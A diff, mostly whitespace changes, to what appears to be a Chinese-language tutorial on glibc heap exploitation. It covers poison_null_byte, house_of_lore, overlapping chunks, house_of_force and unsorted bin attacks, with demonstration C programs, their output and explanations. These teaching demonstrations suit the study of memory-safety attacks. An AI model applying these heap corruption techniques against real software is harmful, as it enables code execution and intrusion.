+    fprintf(stderr,"In newer versions of glibc we will need to have our updated size inside b itself to pass "
+        "the check'chunksize(P) != prev_size (next_chunk(P))'\n");
+    // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
+    // which is the value of b.size after its first byte has been overwritten with a NULL byte
+    *(size_t*)(b+0x1f0) = 0x200;
 
-	// this technique works by overwriting the size metadata of a free chunk
-	free(b);
+    // this technique works by overwriting the size metadata of a free chunk
+    free(b);
 
-	fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
-	fprintf(stderr,"b.size is: (0x200 + 0x10) | prev_in_use\n");
-	fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
-	a[real_a_size] = 0; // <--- THIS IS THE"EXPLOITED BUG"
-	fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr,"b.size is: (0x200 + 0x10) | prev_in_use\n");
+    fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
+    a[real_a_size] = 0; // <--- THIS IS THE"EXPLOITED BUG"
+    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
 
-	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
-	fprintf(stderr,"c.prev_size is %#lx\n",*c_prev_size_ptr);
+    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
+    fprintf(stderr,"c.prev_size is %#lx\n",*c_prev_size_ptr);
 
-	// This malloc will result in a call to unlink on the chunk where b was.
-	// The added check (commit id: 17f487b), if not properly handled as we did before,
-	// will detect the heap corruption now.
-	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
-	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
-	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
-	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
-	fprintf(stderr,"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
-		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
-	b1 = malloc(0x100);
+    // This malloc will result in a call to unlink on the chunk where b was.
+    // The added check (commit id: 17f487b), if not properly handled as we did before,
+    // will detect the heap corruption now.
+    // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
+    // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
+    // next_chunk(P) == b-0x10+0x200 == b+0x1f0
+    // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
+    fprintf(stderr,"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
+        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
+    b1 = malloc(0x100);
 
-	fprintf(stderr,"b1: %p\n",b1);
-	fprintf(stderr,"Now we malloc 'b1'. It will be placed where 'b' was. "
-		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
-	fprintf(stderr,"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
-		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
-	fprintf(stderr,"We malloc 'b2', our 'victim' chunk.\n");
-	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
+    fprintf(stderr,"b1: %p\n",b1);
+    fprintf(stderr,"Now we malloc 'b1'. It will be placed where 'b' was. "
+        "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
+    fprintf(stderr,"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
+        "before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
+    fprintf(stderr,"We malloc 'b2', our 'victim' chunk.\n");
+    // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
 
-	b2 = malloc(0x80);
-	fprintf(stderr,"b2: %p\n",b2);
+    b2 = malloc(0x80);
+    fprintf(stderr,"b2: %p\n",b2);
 
-	memset(b2,'B',0x80);
-	fprintf(stderr,"Current b2 content:\n%s\n",b2);
+    memset(b2,'B',0x80);
+    fprintf(stderr,"Current b2 content:\n%s\n",b2);
 
-	fprintf(stderr,"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about'b2').\n");
+    fprintf(stderr,"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about'b2').\n");
 
-	free(b1);
-	free(c);
+    free(b1);
+    free(c);
 
-	fprintf(stderr,"Finally, we allocate 'd', overlapping 'b2'.\n");
-	d = malloc(0x300);
-	fprintf(stderr,"d: %p\n",d);
+    fprintf(stderr,"Finally, we allocate 'd', overlapping 'b2'.\n");
+    d = malloc(0x300);
+    fprintf(stderr,"d: %p\n",d);
 
-	fprintf(stderr,"Now 'd' and 'b2' overlap.\n");
-	memset(d,'D',0x300);
+    fprintf(stderr,"Now 'd' and 'b2' overlap.\n");
+    memset(d,'D',0x300);
 
-	fprintf(stderr,"New b2 content:\n%s\n",b2);
+    fprintf(stderr,"New b2 content:\n%s\n",b2);
 
-	fprintf(stderr,"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
-		"for the clear explanation of this technique.\n");
+    fprintf(stderr,"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
+        "for the clear explanation of this technique.\n");
 }
 ```
-
 
 输出：
 
@@ -705,7 +691,6 @@ DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
 Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
 ```
 
-
 这里的漏洞很简单，就是 off-by-null，通过 `a` 溢出了一字节到已经被释放了的 `b`，使得 `b` 的 `chunk_size` 被改变。这里需要注意的是，新版本 glibc 增加了检验机制，如果 `chunksize(P) != prev_size (next_chunk(P))` 则会报错，那么如何绕过呢？
 
 我们知道 P 是指 chunk 指针，也就是 `b-0x10`，那么 `b-0x8` 就是这里的 `chunksize(P)`，被 off-by-null 后变成 0x200。而 `next_chunk(P)` 则为 `b-0x10+0x200 = b+0x1f0`。所以 `prev_size(next_chunk(P))` 实际上就是 `*(b+0x1f0)`。那么我们提前修改 `b+0x1f0 = 0x200` 既绕过了验证。
@@ -715,6 +700,7 @@ Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-
 于是我们在 `b1` 下面申请 0x80 的 `b2`，尽管它被夹在 `b1` 和 `c` 中间，当我们释放 `b1` 和 `c` 时两者依旧会合并，但我们依然控制着 `b2` 指针！这个时候申请 0x300 的 `d`，它还是会被放到 `b1` 的位置，那么通过 `d` 就可以完全控制 `b2` 这个 chunk。
 
 ## house_of_lore
+
 源码：
 
 ```c
@@ -831,7 +817,6 @@ int main(int argc, char * argv[]){
 }
 ```
 
-
 输出：
 
 ```
@@ -872,12 +857,11 @@ p4 is 0x7ffd3c0b7470 and should be on the stack!
 Nice jump d00d
 ```
 
-
 逻辑还是比较简单的，就是通过修改栈变量以及堆上 small chunk `victim` 的 `bk` 指针构造出一条完整的双向链表，以通过 small bin 检查从而使得 `malloc` 返回一个栈上地址。注意中间关键的一步是申请了一个不能被 unsorted bin 和 small bin 满足的 chunk，因此只能从 top chunk 切割，这时原本在 unsorted bin 中的 `victim` 就进入了 small bin。
 
 ## overlapping_chunks
-源码：
 
+源码：
 
 ```c
 /*
@@ -896,70 +880,68 @@ Nice jump d00d
 int main(int argc , char* argv[]){
 
 
-	intptr_t *p1,*p2,*p3,*p4;
+    intptr_t *p1,*p2,*p3,*p4;
 
-	fprintf(stderr,"\nThis is a simple chunks overlapping problem\n\n");
-	fprintf(stderr,"Let's start to allocate 3 chunks on the heap\n");
+    fprintf(stderr,"\nThis is a simple chunks overlapping problem\n\n");
+    fprintf(stderr,"Let's start to allocate 3 chunks on the heap\n");
 
-	p1 = malloc(0x100 - 8);
-	p2 = malloc(0x100 - 8);
-	p3 = malloc(0x80 - 8);
+    p1 = malloc(0x100 - 8);
+    p2 = malloc(0x100 - 8);
+    p3 = malloc(0x80 - 8);
 
-	fprintf(stderr,"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);
+    fprintf(stderr,"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);
 
-	memset(p1,'1', 0x100 - 8);
-	memset(p2,'2', 0x100 - 8);
-	memset(p3,'3', 0x80 - 8);
+    memset(p1,'1', 0x100 - 8);
+    memset(p2,'2', 0x100 - 8);
+    memset(p3,'3', 0x80 - 8);
 
-	fprintf(stderr,"\nNow let's free the chunk p2\n");
-	free(p2);
-	fprintf(stderr,"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");
+    fprintf(stderr,"\nNow let's free the chunk p2\n");
+    free(p2);
+    fprintf(stderr,"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");
 
-	fprintf(stderr,"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
-	fprintf(stderr,"For a toy program, the value of the last 3 bits is unimportant;"
-		"however, it is best to maintain the stability of the heap.\n");
-	fprintf(stderr,"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
-		"to assure that p1 is not mistaken for a free chunk.\n");
+    fprintf(stderr,"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
+    fprintf(stderr,"For a toy program, the value of the last 3 bits is unimportant;"
+        "however, it is best to maintain the stability of the heap.\n");
+    fprintf(stderr,"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
+        "to assure that p1 is not mistaken for a free chunk.\n");
 
-	int evil_chunk_size = 0x181;
-	int evil_region_size = 0x180 - 8;
-	fprintf(stderr,"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
-		 evil_chunk_size, evil_region_size);
+    int evil_chunk_size = 0x181;
+    int evil_region_size = 0x180 - 8;
+    fprintf(stderr,"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
+         evil_chunk_size, evil_region_size);
 
-	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
+    *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
 
-	fprintf(stderr,"\nNow let's allocate another chunk with a size equal to the data\n"
-	       "size of the chunk p2 injected size\n");
-	fprintf(stderr,"This malloc will be served from the previously freed chunk that\n"
-	       "is parked in the unsorted bin which size has been modified by us\n");
-	p4 = malloc(evil_region_size);
+    fprintf(stderr,"\nNow let's allocate another chunk with a size equal to the data\n"
+           "size of the chunk p2 injected size\n");
+    fprintf(stderr,"This malloc will be served from the previously freed chunk that\n"
+           "is parked in the unsorted bin which size has been modified by us\n");
+    p4 = malloc(evil_region_size);
 
-	fprintf(stderr,"\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
-	fprintf(stderr,"p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
-	fprintf(stderr,"p4 should overlap with p3, in this case p4 includes all p3.\n");
+    fprintf(stderr,"\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
+    fprintf(stderr,"p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
+    fprintf(stderr,"p4 should overlap with p3, in this case p4 includes all p3.\n");
 
-	fprintf(stderr,"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
-		"and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");
+    fprintf(stderr,"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
+        "and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");
 
-	fprintf(stderr,"Let's run through an example. Right now, we have:\n");
-	fprintf(stderr,"p4 = %s\n", (char *)p4);
-	fprintf(stderr,"p3 = %s\n", (char *)p3);
+    fprintf(stderr,"Let's run through an example. Right now, we have:\n");
+    fprintf(stderr,"p4 = %s\n", (char *)p4);
+    fprintf(stderr,"p3 = %s\n", (char *)p3);
 
-	fprintf(stderr,"\nIf we memset(p4,'4', %d), we have:\n", evil_region_size);
-	memset(p4,'4', evil_region_size);
-	fprintf(stderr,"p4 = %s\n", (char *)p4);
-	fprintf(stderr,"p3 = %s\n", (char *)p3);
+    fprintf(stderr,"\nIf we memset(p4,'4', %d), we have:\n", evil_region_size);
+    memset(p4,'4', evil_region_size);
+    fprintf(stderr,"p4 = %s\n", (char *)p4);
+    fprintf(stderr,"p3 = %s\n", (char *)p3);
 
-	fprintf(stderr,"\nAnd if we then memset(p3,'3', 80), we have:\n");
-	memset(p3,'3', 80);
-	fprintf(stderr,"p4 = %s\n", (char *)p4);
-	fprintf(stderr,"p3 = %s\n", (char *)p3);
+    fprintf(stderr,"\nAnd if we then memset(p3,'3', 80), we have:\n");
+    memset(p3,'3', 80);
+    fprintf(stderr,"p4 = %s\n", (char *)p4);
+    fprintf(stderr,"p3 = %s\n", (char *)p3);
 }
 ```
 
-
 输出：
-
 
 ```
 This is a simple chunks overlapping problem
@@ -1006,13 +988,11 @@ p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444
 p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
 ```
 
-
 源程序和输出结果里已经相当清晰了，这里就是修改了一个 unsorted bin 中的 free chunk 的 `chunk_size`，然后把它申请回来，这样它的一部分就和原本紧挨在下面的 chunk 重叠了，那么向它的这部分写入数据就会影响到下面的这个 chunk，反之亦然。
 
 ## overlapping_chunks_2
 
 源码：
-
 
 ```c
 /*
@@ -1097,9 +1077,7 @@ int main(){
 }
 ```
 
-
 输出：
-
 
 ```
 This is a simple chunks overlapping problem
@@ -1143,14 +1121,13 @@ Data inside chunk p3:
 FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
 ```
 
-
 和上一个的区别在于，这次修改的是 allocated chunk 的 `chunk_size`。首先申请五个大小超过 fastbin 范围的 chunk，然后 `free(p4)`。随后通过 `p1` 的堆溢出修改 `p2` 的 `chunk_size` 为 `p2` 与 `p3` 的 `chunk_size` 之和。这就导致在 `free(p2)` 时，分配器认为需要释放 `chunk_size2+chunk_size3` 这么大一块内存，而下一块 chunk 恰好是同样空闲的 `p4`，这样就会将原本不相邻的 `p2` 和 `p4` 合并释放，中间的 `p3` 则成了最大受害者。
 
 这时再申请一块 `chunk_size2+chunk_size3` 的 chunk`p6`，它就和 `p3` 重叠了，控制了整块 `p3` 的数据。
 
 ## house_of_force
-源码：
 
+源码：
 
 ```c
 /*
@@ -1175,85 +1152,83 @@ char bss_var[] ="This is a string that we want to overwrite.";
 
 int main(int argc , char* argv[])
 {
-	fprintf(stderr,"\nWelcome to the House of Force\n\n");
-	fprintf(stderr,"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
-	fprintf(stderr,"The top chunk is a special chunk. Is the last in memory "
-		"and is the chunk that will be resized when malloc asks for more space from the os.\n");
+    fprintf(stderr,"\nWelcome to the House of Force\n\n");
+    fprintf(stderr,"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
+    fprintf(stderr,"The top chunk is a special chunk. Is the last in memory "
+        "and is the chunk that will be resized when malloc asks for more space from the os.\n");
 
-	fprintf(stderr,"\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
-	fprintf(stderr,"Its current value is: %s\n", bss_var);
-
-
-
-	fprintf(stderr,"\nLet's allocate the first chunk, taking space from the wilderness.\n");
-	intptr_t *p1 = malloc(256);
-	fprintf(stderr,"The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
-
-	fprintf(stderr,"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
-	int real_size = malloc_usable_size(p1);
-	fprintf(stderr,"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);
-
-	fprintf(stderr,"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
-
-	//----- VULNERABILITY ----
-	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
-	fprintf(stderr,"\nThe top chunk starts at %p\n", ptr_top);
-
-	fprintf(stderr,"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
-	fprintf(stderr,"Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
-	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
-	fprintf(stderr,"New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
-	//------------------------
-
-	fprintf(stderr,"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
-	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
-	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
-
-	/*
-	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
-	 * new_top = old_top + nb
-	 * nb = new_top - old_top
-	 * req + 2sizeof(long) = new_top - old_top
-	 * req = new_top - old_top - 2sizeof(long)
-	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
-	 * req = dest - old_top - 4*sizeof(long)
-	 */
-	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
-	fprintf(stderr,"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
-	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
-	void *new_ptr = malloc(evil_size);
-	fprintf(stderr,"As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
-
-	void* ctr_chunk = malloc(100);
-	fprintf(stderr,"\nNow, the next chunk we overwrite will point at our target buffer.\n");
-	fprintf(stderr,"malloc(100) => %p!\n", ctr_chunk);
-	fprintf(stderr,"Now, we can finally overwrite that value:\n");
-
-	fprintf(stderr,"... old string: %s\n", bss_var);
-	fprintf(stderr,"... doing strcpy overwrite with \"YEAH!!!\"...\n");
-	strcpy(ctr_chunk,"YEAH!!!");
-	fprintf(stderr,"... new string: %s\n", bss_var);
+    fprintf(stderr,"\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
+    fprintf(stderr,"Its current value is: %s\n", bss_var);
 
 
-	// some further discussion:
-	//fprintf(stderr,"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
-	//fprintf(stderr,"This because the main_arena->top pointer is setted to current av->top + malloc_size "
-	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
-	//fprintf(stderr,"In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
-	//fprintf(stderr,"The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
-	//fprintf(stderr,"After that a new call to malloc will return av->top+8 (+8 bytes for the header),"
-	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");
 
-	//fprintf(stderr,"The large chunk with evil_size has been allocated here 0x%08x\n",p2);
-	//fprintf(stderr,"The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
+    fprintf(stderr,"\nLet's allocate the first chunk, taking space from the wilderness.\n");
+    intptr_t *p1 = malloc(256);
+    fprintf(stderr,"The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
 
-	//fprintf(stderr,"This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
+    fprintf(stderr,"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
+    int real_size = malloc_usable_size(p1);
+    fprintf(stderr,"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);
+
+    fprintf(stderr,"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
+
+    //----- VULNERABILITY ----
+    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
+    fprintf(stderr,"\nThe top chunk starts at %p\n", ptr_top);
+
+    fprintf(stderr,"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
+    fprintf(stderr,"Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+    *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+    fprintf(stderr,"New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+    //------------------------
+
+    fprintf(stderr,"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
+       "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
+       "overflow) and will then be able to allocate a chunk right over the desired region.\n");
+
+    /*
+     * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
+     * new_top = old_top + nb
+     * nb = new_top - old_top
+     * req + 2sizeof(long) = new_top - old_top
+     * req = new_top - old_top - 2sizeof(long)
+     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
+     * req = dest - old_top - 4*sizeof(long)
+     */
+    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+    fprintf(stderr,"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
+       "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
+    void *new_ptr = malloc(evil_size);
+    fprintf(stderr,"As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
+
+    void* ctr_chunk = malloc(100);
+    fprintf(stderr,"\nNow, the next chunk we overwrite will point at our target buffer.\n");
+    fprintf(stderr,"malloc(100) => %p!\n", ctr_chunk);
+    fprintf(stderr,"Now, we can finally overwrite that value:\n");
+
+    fprintf(stderr,"... old string: %s\n", bss_var);
+    fprintf(stderr,"... doing strcpy overwrite with \"YEAH!!!\"...\n");
+    strcpy(ctr_chunk,"YEAH!!!");
+    fprintf(stderr,"... new string: %s\n", bss_var);
+
+
+    // some further discussion:
+    //fprintf(stderr,"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
+    //fprintf(stderr,"This because the main_arena->top pointer is setted to current av->top + malloc_size "
+    //    "and we \nwant to set this result to the address of malloc_got_address-8\n\n");
+    //fprintf(stderr,"In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
+    //fprintf(stderr,"The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
+    //fprintf(stderr,"After that a new call to malloc will return av->top+8 (+8 bytes for the header),"
+    //    "\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");
+
+    //fprintf(stderr,"The large chunk with evil_size has been allocated here 0x%08x\n",p2);
+    //fprintf(stderr,"The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
+
+    //fprintf(stderr,"This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
 }
 ```
 
-
 输出：
-
 
 ```
 Welcome to the House of Force
@@ -1294,12 +1269,12 @@ Now, we can finally overwrite that value:
 ... new string: YEAH!!!
 ```
 
-
 这个例子里要覆盖的地址位于 bss 段，处于 heap 段的下方，但是 heap 是向高地址生长的。所以这里的核心思想是利用整数溢出。
 
 首先需要存在堆溢出漏洞。我们分配一个 `chunk0`，此时堆上只有两个 chunk：`chunk0` 和 top chunk。利用溢出修改 top chunk 的 `chunk_size` 为 `-1`，即 `0xffffffffffffffff`。这样做是因为后面需要申请很大的 chunk 进行整数溢出，这很可能导致 top chunk 大小不够，不去从 top chunk 切割而是调用 `mmap()`。伪造了 top chunk 的大小后，在后面申请大 chunk 时就不会触发 `mmap()`，确保了申请的大 chunk 也是从 top chunk 切割的。
 
 接下来我们申请一个 `evil_size` 大小的 chunk，使得申请后 top chunk 指针（经过整数溢出）指向我们想要覆盖的变量 `bss_var` 的前面。这个 `evil_size` 的计算方法如下：
+
 ```
 The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
 * new_top = old_top + nb
@@ -1313,8 +1288,8 @@ The evil_size is calulcated as (nb is the number of bytes requested + space for 
 这时再次 `malloc`，得到的就是指向 `bss_var` 的指针了。
 
 ## unsorted_bin_into_stack
-源码：
 
+源码：
 
 ```c
 #include <stdio.h>
@@ -1350,9 +1325,7 @@ int main() {
 }
 ```
 
-
 输出：
-
 
 ```
 Allocating the victim chunk
@@ -1364,7 +1337,6 @@ Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160
 malloc(0x100): 0x7ffe82ca7160
 ```
 
-
 首先分配一个 0x100 的 chunk`victim`，在下面再垫一个 chunk 防止与 top chunk 合并，释放 `victim` 进入 unsorted bin。现在在栈上伪造大小为 `0x110` 的 chunk，并使其 `bk` 指向任意一个可写地址，比如自身。
 
 假设存在漏洞可以修改 `victim` 的 `chunk_size` 和 `bk`，那么我们可以将它的 `chunk_size` 改为合法 `nextsize` 范围内的一个值，且小于 0x100。而 `bk` 则改为我们刚才伪造的 chunk。这样下一次 `malloc(0x100)` 就会顺着 `bk` 查找，首先找到 `victim` 但大小不够，放入 small bin。随后找到我们伪造的 chunk 并返回，此时伪造 chunk 的 `fd` 已经指向 `main_arena+88`，可以借此泄露 libc。
@@ -1373,48 +1345,45 @@ malloc(0x100): 0x7ffe82ca7160
 
 源码：
 
-
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main(){
-	fprintf(stderr,"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
-	fprintf(stderr,"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
-		   "global variable global_max_fast in libc for further fastbin attack\n\n");
+    fprintf(stderr,"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
+    fprintf(stderr,"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
+           "global variable global_max_fast in libc for further fastbin attack\n\n");
 
-	unsigned long stack_var=0;
-	fprintf(stderr,"Let's first look at the target we want to rewrite on stack:\n");
-	fprintf(stderr,"%p: %ld\n\n", &stack_var, stack_var);
+    unsigned long stack_var=0;
+    fprintf(stderr,"Let's first look at the target we want to rewrite on stack:\n");
+    fprintf(stderr,"%p: %ld\n\n", &stack_var, stack_var);
 
-	unsigned long *p=malloc(400);
-	fprintf(stderr,"Now, we allocate first normal chunk on the heap at: %p\n",p);
-	fprintf(stderr,"And allocate another normal chunk in order to avoid consolidating the top chunk with"
+    unsigned long *p=malloc(400);
+    fprintf(stderr,"Now, we allocate first normal chunk on the heap at: %p\n",p);
+    fprintf(stderr,"And allocate another normal chunk in order to avoid consolidating the top chunk with"
            "the first one during the free()\n\n");
-	malloc(500);
+    malloc(500);
 
-	free(p);
-	fprintf(stderr,"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
-		   "point to %p\n",(void*)p[1]);
+    free(p);
+    fprintf(stderr,"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
+           "point to %p\n",(void*)p[1]);
 
-	//------------VULNERABILITY-----------
+    //------------VULNERABILITY-----------
 
-	p[1]=(unsigned long)(&stack_var-2);
-	fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
-	fprintf(stderr,"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);
+    p[1]=(unsigned long)(&stack_var-2);
+    fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+    fprintf(stderr,"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);
 
-	//------------------------------------
+    //------------------------------------
 
-	malloc(400);
-	fprintf(stderr,"Let's malloc again to get the chunk we just free. During this time, the target should have already been"
-		   "rewritten:\n");
-	fprintf(stderr,"%p: %p\n", &stack_var, (void*)stack_var);
+    malloc(400);
+    fprintf(stderr,"Let's malloc again to get the chunk we just free. During this time, the target should have already been"
+           "rewritten:\n");
+    fprintf(stderr,"%p: %p\n", &stack_var, (void*)stack_var);
 }
 ```
 
-
 输出：
-
 
 ```
